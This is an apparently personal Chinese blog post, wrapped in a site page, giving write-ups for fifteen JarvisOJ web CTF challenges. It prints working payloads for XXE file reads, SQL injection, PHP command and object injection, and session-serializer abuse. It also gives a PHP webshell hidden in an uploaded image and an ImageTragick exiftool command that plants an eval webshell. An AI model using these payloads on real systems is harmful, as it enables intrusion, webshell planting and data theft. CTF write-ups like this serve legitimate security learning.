@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="10月后刷的，发现自己果然还是只菜鸡orz">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj web wp">
+<meta property="og:url" content="http://yoursite.com/2019/02/04/jarvisoj-web-wp/index.html">
+<meta property="og:site_name" content="shifeng_kazeの家">
+<meta property="og:description" content="10月后刷的，发现自己果然还是只菜鸡orz">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/917d1a7329d1d3869e523a1466c2fdad.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/957e2de2490326ebae8438202ba0dfce.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/db69fc039dcbd2962cb4d28f5891aae1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/d7adc790fe0159c1bf3864c9148b52cc.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/50306d2abefff5b285fa0e7b00ceb917.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/bec2011ed359ffd6a81451914dfce33f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/1ca07667861f649e3069774f98f21ae3.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/61bc6185c9f7da12429b8a47c4a2e93a.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/6aebe267f305de034d9303ce482811cc.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/951d00cc33542e335895942cab3d0bdf.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/fe30ee96aff7f014267153ec161ae90c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/d4c21df397e3dbe0acea3f89862122cf.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/64610b63c94246f94c0c46cf774e7bdb.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/671baee93f9adf905a18ee80936f3d4e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/987f182af3b7448c0543035e1547278e.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/13efc1e148f27b9913ad60e05c508abe.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/4b01a3ae6efd0a53d21fcc1a926ea6f1.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/450555e452564c3f63797ed4ecafef57.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/cbae3798468fb079513d76f2792c9a45.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/cfe8e7be5fd4b2a4c99bff5f4a79adb2.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/c5b0acf1cce2ec981471e8afa4a2e116.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/c91daa8821855f85cec7212f4c2edc24.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/3c7bc7bf0919ad4594caf75ef50e4be0.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/31ce90ede259477f1de1e1e47fb15237.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/9f1f74ad4342990f076228e8ed9b0d03.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/0602b9739558864e05e33f341d120771.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/42fee971e4e2cd206426bde519f01718.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/b5f0a1ec86034485bae9c2f2949ab798.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/6c40ab81a794332ede84e567f2304acf.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/ef7d408466e08955eefbbe82e6466a1c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/6c9e472420a7a47d2478eb28f3b34bf5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/47d3fa50fd2c220f3a234451370a1664.png">
+<meta property="og:updated_time" content="2019-02-04T07:24:55.781Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="jarvisoj web wp">
+<meta name="twitter:description" content="10月后刷的，发现自己果然还是只菜鸡orz">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/917d1a7329d1d3869e523a1466c2fdad.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/04/jarvisoj-web-wp/">
+
+
+
+
+
+  <title>jarvisoj web wp | shifeng_kazeの家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">shifeng_kazeの家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/04/jarvisoj-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shifeng_kaze">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="shifeng_kazeの家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">jarvisoj web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-04T13:54:52+08:00">
+                2019-02-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>10月后刷的，发现自己果然还是只菜鸡orz</p>
+<a id="more"></a>
+<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>本来以为是访问51端口，发现不对，是要用自己的51端口取访问<br>不过不知道为什么电脑上不行，只能上vps用curl命令获得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/917d1a7329d1d3869e523a1466c2fdad.png" alt=""></p>
+<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>抓包，加上X-Forwarded-For:127.0.0.1得flag</p>
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>先抓个包，tips里给了sql<br>看语句应该是要md5的闭合绕过，于是用ffifdyop解决</p>
+<h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><p>这题题目提示flag在/home/ctf/flag.txt里<br>进去抓包抓到一个json格式打包的数据，查看前端源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/957e2de2490326ebae8438202ba0dfce.png" alt=""></p>
+<p>发现有个XMLHttpRequest对象，说明后台有可能能够处理xml<br>于是就尝试XXE攻击<br>先把Content-Type改成application/xml<br>然后传一个外部实体过去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;flags&gt;&amp;flag;&lt;/flags&gt;</span><br></pre></td></tr></table></figure>
+<p>得flag</p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>先抓包，没发现什么，于是试着查robots.txt</p>
+<p>发现admin_s3cr3t.php，然后打开发现flag</p>
+<p>提交后提示是假flag，于是再抓包，发现admin参数，修改为1后得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/db69fc039dcbd2962cb4d28f5891aae1.png" alt=""></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h2><p>看到有登录先尝试注入，好像没什么用就抓包，发现返回了一个json文本也没什么用<br>然后又在前端找到了一个app.js</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/d7adc790fe0159c1bf3864c9148b52cc.png" alt=""></p>
+<p>然后用chrome，点击{}处格式化代码然后复制到编辑器里<br>然后搜索Wrong Password!!</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/50306d2abefff5b285fa0e7b00ceb917.png" alt=""></p>
+<p>读一下，大概就是判断checkpass这个函数返回值是否为true，true就Success。于是去查这个函数</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/bec2011ed359ffd6a81451914dfce33f.png" alt=""></p>
+<p>然后这个函数返回的时r类的<strong>checkpass</strong>REACT_HOT_LOADER__变量，于是再去查一下这个变量</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/1ca07667861f649e3069774f98f21ae3.png" alt=""></p>
+<p>再读一下这个函数，可以知道这是在算一个25元方程的解</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/61bc6185c9f7da12429b8a47c4a2e93a.png" alt=""></p>
+<p>手算是不可能手算的，python一波解决，解得flag</p>
+<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>打开查看源码发现注释了个flag的提示</p>
+<p>本来以为这样就可以了，不过果然想多了，于是点开其他的看看</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/6aebe267f305de034d9303ce482811cc.png" alt=""></p>
+<p>提示了GIT，就觉得可能有什么东西，查了一下说是有git文件泄露在.git，于是用GitHack查一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/951d00cc33542e335895942cab3d0bdf.png" alt=""></p>
+<p>读源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/fe30ee96aff7f014267153ec161ae90c.png" alt=""></p>
+<p>过滤了..，同时有assert()可利用，不过不太熟练，用别人写的payload得出<br>‘.system(‘cat%20templates/flag.php’).’<br>这里system()先运行，然后说是system是会直接输出的，而于cat命令是读取，于是就直接把flag.php输出了<br>不知道为什么直接写到url里不行，可能有编码问题吧</p>
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>查源码发现应该是提示读取文件</p>
+<p>于是用base64编码把index.php，sheild.php，showimg.php得到</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/d4c21df397e3dbe0acea3f89862122cf.png" alt=""></p>
+<p>于是用base64编码把index.php，sheild.php，showimg.php得到</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/64610b63c94246f94c0c46cf774e7bdb.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/671baee93f9adf905a18ee80936f3d4e.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/987f182af3b7448c0543035e1547278e.png" alt=""></p>
+<p>这里不能直接pctf.php获取，只能通过反序列化<br>于是构造?class=O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}得flag</p>
+<h2 id="Inject2"><a href="#Inject2" class="headerlink" title="Inject2"></a>Inject2</h2><p>说是要找源码，就扫一波后台看看<br>发现然后在index.php~中得到源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/13efc1e148f27b9913ad60e05c508abe.png" alt=""></p>
+<p>一开始一直在纠结config.php，没想到攻破点是desc<br>这里的desc和排序的那个不一样，在用`注明时，后面会检测为表名，然后desc的作用为describe，用来描述表<br>然后注入点在当desc后有两个表名时，若第一个表名存在语句就会正确，同时第二个表名会被认为是第一个表名的别名。可以通过这个来绕过第一个，同时两个反引号在select中也是能作为表名的标识符<br>于是paylaod就：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test` `union select 123</span><br><span class="line">test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1</span><br><span class="line">test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1</span><br><span class="line">test` `union select group_concat(flagUwillNeverKnow ) from secret_flag limit 1,1</span><br></pre></td></tr></table></figure>
+<p>现在才知道表名后就可以直接union select，我还是太菜了orz<br>还有反引号有一定注释的作用，因为未知原因mysql里可以一个反引号就标注为表名，此时反引号后的都会作为表的别名，只要是在能用别名的地方反引号能作为注释使用</p>
+<h2 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h2><p>确实是道简单的注入<br>尝试 <code>username=admin&#39;#</code> 提示密码错误，说明没过滤’和#<br>然后尝试 <code>username=admin&#39; or 1#</code> 却提示用户名错误，估计是过滤了or或空格<br>然后尝试 <code>username=admin&#39; or&#39;#</code> 却是密码错误有点迷，猜测不能有一个以上的空格之类的？<br>于是就 <code>username=admin&#39; or/**/1#</code> 成功提示密码错误<br>接着就 <code>username=admin&#39; union/**/select/**/1#</code> 成功提示密码错误<br>然后 <code>username=admin&#39; union/**/select/**/1#&amp;password=1</code> 还是密码错误，也许有md5()加密<br>最后 <code>username=admin&#39; union/**/select/**/md5(1)#&amp;password=1</code> 出flag</p>
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/4b01a3ae6efd0a53d21fcc1a926ea6f1.png" alt=""></p>
+<p>读码，先添加参数phpinfo得到phpinfo<br>然后还能看到当该脚本运行时，序列化的方式是php</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/450555e452564c3f63797ed4ecafef57.png" alt=""></p>
+<p>但可以看到，session中序列化的方式是php_serialize，于是就产生了漏洞<br>若我们写这句代码： <code>$_SESSION[&#39;name&#39;] = &#39;spoock&#39;;</code><br>当使用php的序列化方式为php时，储存的方式是： <code>name|s:6:&quot;spoock&quot;;</code><br>而php_serialize则是 <code>a:1:{s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;}</code><br>当我们传入一个值： <code>$_SESSION[&#39;ryat&#39;] = &#39;|O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:2:&quot;xx&quot;;}&#39;</code><br>在session进行php_serialize的序列化时，会成：<br><code>a:1:{s:4:&quot;ryat&quot;;s:30:&quot;|O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:2:&quot;xx&quot;;}</code><br>但当用php进行反序列化时，会识别|，将前面的都认为时变量名，后面为值，于是就：<br><code>xxarray(1) { [&quot;a:1:{s:4:&quot;ryat&quot;;s:30:&quot;&quot;] =&gt; object(A)#1 (1) { [&quot;a&quot;] =&gt; string(2) &quot;xx&quot;}}</code><br>通过这样，就将一个类给传入脚本中了<br>然后在这里，我们并没有看到能传入变量的地方</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/cbae3798468fb079513d76f2792c9a45.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/cfe8e7be5fd4b2a4c99bff5f4a79adb2.png" alt=""></p>
+<p>php有session.upload_progress.enabled这样的一个配置，开启是，当post中有变量名与session.upload_progress.name的值相同时，会往session储存数据，以此来监测上传进度<br>这里phpinfo显示session.upload_progress.enabled开启，于是我们可以利用这个来向session里存入变量<br>在前端构造一下</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/c5b0acf1cce2ec981471e8afa4a2e116.png" alt=""></p>
+<p>随便传点东西获取报文<br>然后获取序列化要的</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/c91daa8821855f85cec7212f4c2edc24.png" alt=""></p>
+<p>爆出目录下文件</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/3c7bc7bf0919ad4594caf75ef50e4be0.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/31ce90ede259477f1de1e1e47fb15237.png" alt=""></p>
+<p>再从phpinfo里获取路径<br>爆出flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/9f1f74ad4342990f076228e8ed9b0d03.png" alt=""></p>
+<h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p>先尝试在submit上传一波图片，然后再view那里读取(这里有点坑，不知道这么想的参数传入那用了个+号)，发现文件是保存在uploads/下<br>然后上传张图片(直接想传php是不行的，这里对文件的IMME进行了检测)用bp抓包，往图片里加一句话木马<br>尝试用php去然而发现被过滤了，于是尝试script的方法成功： <code>&lt;script language=&#39;php&#39;&gt; echo &quot;123&quot;; &lt;/script&gt;</code></p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/0602b9739558864e05e33f341d120771.png" alt=""></p>
+<p>然后读取upload/(…).jpg%00就行（这里page参数读取时会自动添加.php，于是需要%00去截断）</p>
+<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>F12发现index.phps,打开得到源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/42fee971e4e2cd206426bde519f01718.png" alt=""></p>
+<p>要求$b长度大于5，同时第一个字符为4且又不能为4<br>构造 <code>?id=0.0&amp;b=%004dasdasdas&amp;a=php://input</code><br>然后post个1112 is a nice lab!得到一个新的地址/^HT2mCpcvOLf<br>进去，然后过滤了好多东西，于是尝试盲注<br>语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5||(selselectect(sleep(ascii(mid(((selselectect(group_concat(schema_name))frfromom(information_schema.schemata)))frfromom(1)for(1)))=50)))</span><br><span class="line">5||(selselectect(sleep((selselectect(length(group_concat(schema_name)))frfromom(information_schema.schemata))=50)))</span><br></pre></td></tr></table></figure>
+<p>不过在查xml这三个ascii码时会直接弹出waf，于是将得到的flag：<br>PCTF{Fin4  y_U_got_ 7_C0ngRatu ation5}<br>猜测为<br>PCTF{Fin4lly_U_got_ 7_C0ngRatulation5}<br>但有一个不行，只能一个个试，最后成功试出<br>PCTF{Fin4lly_U_got_i7_C0ngRatulation5}<br>不过看别人的wp这道题好像可以直接注入，亏大了orz</p>
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re?"></a>Re?</h2><p>这题给了个so文件，提示了help_me函数，不过还是没什么头绪，看wp才知道so文件是可以在Linux上导入数据库的，于是就有了一波操作<br><code>create function help_me returns string soname &#39;udf.so.02f8981200697e5eeb661e64797fc172&#39;;</code><br>用这条语句定义help_me函数同时将so文件导入，然后提示getflag函数，然后用同样方法创建导入即可</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/b5f0a1ec86034485bae9c2f2949ab798.png" alt=""></p>
+<h2 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h2><p>又成功考到了我的知识盲点，常规操作全部gg。然后扫了一下发现test.php，打开是phpinfo，然而还是不会orz<br>看大佬的wp才知道是imagick这的漏洞(CVE-2016-3714)</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/6c40ab81a794332ede84e567f2304acf.png" alt=""></p>
+<p>大概就是这个imagick的源码里有很多占位符，然后有个%l是图片的exif label信息，同时这个%l正好在一个命令执行的位置，于是产生了命令执行漏洞<br>用exiftool执行该命令：<br><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploa ds/x.php; \&quot;&quot; xxx.jpg</code> (好像png被禁用了)<br>然后filetype修改为show(这个漏洞只有show或win文件的才会触发)</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/ef7d408466e08955eefbbe82e6466a1c.png" alt=""></p>
+<p>然后上菜刀得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/6c9e472420a7a47d2478eb28f3b34bf5.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/jarvisoj_web_wp/47d3fa50fd2c220f3a234451370a1664.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/04/实验吧-web-wp/" rel="next" title="实验吧 web wp">
+                <i class="fa fa-chevron-left"></i> 实验吧 web wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="shifeng_kaze">
+            
+              <p class="site-author-name" itemprop="name">shifeng_kaze</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PORT51"><span class="nav-number">1.</span> <span class="nav-text">PORT51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">2.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login"><span class="nav-number">3.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#api调用"><span class="nav-number">4.</span> <span class="nav-text">api调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin"><span class="nav-number">5.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">6.</span> <span class="nav-text">WEB?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyphp"><span class="nav-number">7.</span> <span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">8.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Inject2"><span class="nav-number">9.</span> <span class="nav-text">Inject2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-Injection"><span class="nav-number">10.</span> <span class="nav-text">Simple Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHPINFO"><span class="nav-number">11.</span> <span class="nav-text">PHPINFO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-Gallery"><span class="nav-number">12.</span> <span class="nav-text">Easy Gallery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IN-A-Mess"><span class="nav-number">13.</span> <span class="nav-text">IN A Mess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">14.</span> <span class="nav-text">Re?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片上传漏洞"><span class="nav-number">15.</span> <span class="nav-text">图片上传漏洞</span></a></li></ol></div>
